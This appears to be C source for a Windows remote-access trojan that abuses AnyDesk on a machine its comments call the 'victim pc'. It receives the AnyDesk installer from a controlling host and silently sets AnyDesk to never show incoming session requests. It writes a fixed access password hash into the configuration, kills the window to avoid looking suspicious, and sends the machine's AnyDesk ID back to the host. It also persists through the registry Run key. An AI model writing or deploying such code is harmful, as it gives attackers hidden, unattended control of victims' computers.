#include <stdio.h>
#include <Windows.h>
#include <string.h>

#define BUFFER_SIZE 1024
#define ANYDESK_CODE_ERROR "no-code__" // The code has to be 9 digits

char anyDeskFilePath[1024]; // Contains the path to the anydesk file

// Functions
void installAnyDesk(int hostSocket);
void _defineAnyDeskSettings();
char *_getCode();
void sendCode(int serverSocket);
int startsWith(const char *a, const char *b);
void recv_file(int socket, char *fileName);
void powerOffAnyDesk();
void powerOnAnyDesk();

void setAnyDeskFilePath()
{
    /*
    Puts inside [anydeskFilePath] the path to the anydesk file
    */

    // Sets the path
    strcpy(anyDeskFilePath, getenv("USERPROFILE"));
    strcat(anyDeskFilePath, "\\Downloads\\anydesk.exe");

    printf("The anydesk file path is: ");
    puts(anyDeskFilePath);
}

int startsWith(const char *a, const char *b)
{
    if (strncmp(a, b, strlen(b)) == 0)
        return 0;
    return 1;
}

void installAnyDesk(int hostSocket)
{
    /*
    Installs anydesk on this pc (victim pc)
    */
    printf("Installing...\n");

    // Gets the file
    recv_file(hostSocket, anyDeskFilePath);

    printf("The Installing has been successfully completed!\n");

    printf("Definning settings...\n");
    _defineAnyDeskSettings();
    printf("The settings have been successfully defined!\n");

    sendCode(hostSocket);
}

void recv_file(int socket, char *fileName)
{
    /*
    Recvs file from the socket 

    param 1: the socket
    param 2: the name which will be to the file
    */

    int fileSize, totalReceived = 0, recvBytesAmount;
    char buffer[BUFFER_SIZE] = {0};
    FILE *fp = fopen(fileName, "wb");

    // Recvs the file size
    if (recv(socket, (char *)&fileSize, sizeof(fileSize), 0) == SOCKET_ERROR)
    {
        printf("Error in file recviving (1)");
        exit(1);
    }
    fileSize = ntohl(fileSize); // Converts to little endian

    printf("Recv file size is %d bytes\n", fileSize);

    // Recvs the file
    while (totalReceived < fileSize)
    {
        recvBytesAmount = recv(socket, buffer, sizeof(buffer), 0);
        if (recvBytesAmount == SOCKET_ERROR)
        {
            printf("Error in file recviving (2)");
            exit(1);
        }
        fwrite(buffer, sizeof(char), recvBytesAmount, fp);

        totalReceived += recvBytesAmount;
        printf("recv: %d/%d (%d bytes recv right now)\n", totalReceived, fileSize, recvBytesAmount);
    }

    fclose(fp);
    printf("File has been successfully received!\n");
}

void _defineAnyDeskSettings()
{
    /*
    Defines the requried anydesk settins by editting the anydesk files
    */

    char *ANYDESK_FOLDER_PATH, ANYDESK_SYSTEM_FILE_PATH[80], ANYDESK_SERVICE_FILE_PATH[80], fileLine[2048], *code;
    int lineIndex = 0, attemptsAmount = 0;
    FILE *ANYDESK_SYSTEM_FILE, *ANYDESK_SERVICE_FILE;

    // Launch anydesk
    ShellExecute(NULL, NULL, anyDeskFilePath, NULL, NULL, SW_SHOWNORMAL);

    // Gets the path of the anydesk folder
    ANYDESK_FOLDER_PATH = (char *)calloc(60, sizeof(char));
    strcpy(ANYDESK_FOLDER_PATH, getenv("APPDATA"));
    strcat(ANYDESK_FOLDER_PATH, "\\AnyDesk");

    // The path to the system file
    strcpy(ANYDESK_SYSTEM_FILE_PATH, ANYDESK_FOLDER_PATH);
    strcat(ANYDESK_SYSTEM_FILE_PATH, "\\system.conf");

    // Waits for the anydesk files to be written
    code = _getCode();
    while (strlen(code) == 0)
    {
        if (attemptsAmount == 100)
        {
            // TODO : there is no internet.. do something...
        }
        if (attemptsAmount % 20 == 0)
        {
            system("TASKKILL /F /IM AnyDesk.exe");
            ShellExecute(NULL, NULL, anyDeskFilePath, NULL, NULL, SW_SHOWNORMAL);
        }

        attemptsAmount++;
        printf("anydesk files have not been already writeen. trying again in 2 Second\n");
        Sleep(2000);
        code = _getCode();
    }
    free(code);

    printf("Anydesk files have been writeen..\n");
    // Kills anydesk (Do not want to look suspicious)
    system("TASKKILL /F /IM AnyDesk.exe");

    // Changes the interactive_access to 2 ("Never show incomming session requests")
    ANYDESK_SYSTEM_FILE = fopen(ANYDESK_SYSTEM_FILE_PATH, "r+");

    // Find the index of this line
    while (fscanf(ANYDESK_SYSTEM_FILE, "%s", fileLine) != -1)
    {

        if (startsWith(fileLine, "ad.security.interactive_access=") == 0)
        {
            break;
        }
        lineIndex += strlen(fileLine);
        lineIndex++; // strlen doesn't count \n
    }

    // Changes the actual line
    fseek(ANYDESK_SYSTEM_FILE, lineIndex, 0);
    fputs("ad.security.interactive_access=2\n", ANYDESK_SYSTEM_FILE);

    fclose(ANYDESK_SYSTEM_FILE);

    // Sets the password to "MatanExtreme1346790"

    // The path to the service file
    strcpy(ANYDESK_SERVICE_FILE_PATH, ANYDESK_FOLDER_PATH);
    strcat(ANYDESK_SERVICE_FILE_PATH, "\\service.conf");

    ANYDESK_SERVICE_FILE = fopen(ANYDESK_SERVICE_FILE_PATH, "r+");

    // Appends the password for the connecton
    fseek(ANYDESK_SERVICE_FILE, 0, SEEK_END);
    fputs("ad.anynet.pwd_hash=7af0eb0f951a8d1c4d2b57d975a121ef06bb34fb21722e0e3a600c29bc4907a6\n", ANYDESK_SERVICE_FILE);
    fseek(ANYDESK_SERVICE_FILE, 0, SEEK_END);
    fputs("ad.anynet.pwd_salt=7d4a31e9bc00511a79e719476634488f\n", ANYDESK_SERVICE_FILE);

    fclose(ANYDESK_SERVICE_FILE);
    free(ANYDESK_FOLDER_PATH);
}

char *_getCode()
{
    /*
    Returns the anydesk code of this pc
    */

    char *ANYDESK_SYSTEM_FILE_PATH = (char *)calloc(80, sizeof(char));
    ;
    FILE *ANYDESK_SYSTEM_FILE;
    char fileLine[1024];
    char *code = (char *)calloc(10, sizeof(char));

    // Gets the path of the anydesk system file
    strcpy(ANYDESK_SYSTEM_FILE_PATH, getenv("APPDATA"));
    strcat(ANYDESK_SYSTEM_FILE_PATH, "\\AnyDesk\\system.conf");

    ANYDESK_SYSTEM_FILE = fopen(ANYDESK_SYSTEM_FILE_PATH, "rb");

    // Gets the code
    while (fscanf(ANYDESK_SYSTEM_FILE, "%s", fileLine) != -1)
    {
        if (startsWith(fileLine, "ad.anynet.id=") == 0)
        {
            code = strtok(fileLine, "ad.anynet.id=");
            break;
        }
    }

    fclose(ANYDESK_SYSTEM_FILE);
    free(ANYDESK_SYSTEM_FILE_PATH);
    return code;
}

void sendCode(int hostSocket)
{
    /*
    Sends the anydesk code of this pc to the host
    */

    // Gets the code
    char *code = _getCode();

    // TODO: do something if there is no code..
    if (strlen(code) == 0)
    {
        printf("There is no code...\n");
        code = ANYDESK_CODE_ERROR;
    }
    else
    {
        printf("Sending code: %s Length:%d", code, strlen(code));
    }

    // Sends the code
    if (send(hostSocket, code, strlen(code), 0) == SOCKET_ERROR)
        printf("%d", GetLastError());

    free(code);
}

void powerOnAnyDesk()
{
    /*
    Powers on anydesk 
    */

    printf("Powering on...");
    ShellExecute(NULL, NULL, anyDeskFilePath, NULL, NULL, SW_SHOWNORMAL);

    printf("Anydesk has successfully powered on!");
}

void powerOffAnyDesk()
{
    /*
    Powers off anydesk 
    */

    printf("Powering off...");

    system("TASKKILL /F /IM AnyDesk.exe");
    printf("anydesk has successfully powered off!\n");
}

void addProgramToStartup()
{
    // /*
    // Adds the program to the windows startup folder
    // (All the programs on this folder are auto runned on every boot)
    // */

    // //TODO: Runs the func command as administrator

    // FILE *fp;
    // TCHAR buffer[MAX_PATH] = {0};
    // const char LINK_PATH[100] = "\"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\discord.lnk\""; //TODO: check if the path changes between pc to pc
    // char command[1024] = "mklink";

    // // If we have already added the file to the startup programs folder
    // fp = fopen(LINK_PATH, "r");
    // if (fp)
    // {
    //     // We will end the func
    //     fclose(fp);
    //     return;
    // }

    // // Adds the link path to the command (where the link file will be save)
    // strcat(command, " ");
    // strcat(command, LINK_PATH);
    // strcat(command, " ");

    // // Gets the path of the current file
    // GetModuleFileName(NULL, buffer, MAX_PATH);

    // // Adds the path to the target file to the command(the file which the link will open)
    // strcat(command, "\"");   // The path looks like this -> "path" so we have to add -> " at the start and at the end of the path
    // strcat(command, buffer); // Adds the path
    // strcat(command, "\"");   // Adds -> " to the end of the path

    // system(command); // Executes the command

    // This method not requires administrator agreement (Using registery)  (https://www.youtube.com/watch?v=r7vjqN4_Lv0)
    char re[MAX_PATH];
    GetModuleFileName(NULL, re, MAX_PATH);

    HKEY hkey;
    LONG key = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", 0, KEY_WRITE, &hkey);
    if (ERROR_SUCCESS == key)
    {
        key = RegSetValueEx(hkey, "MyApp", 0, REG_SZ, (BYTE *)re, strlen(re));
    }
}

void hideConsoleWindow()
{
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 1);
}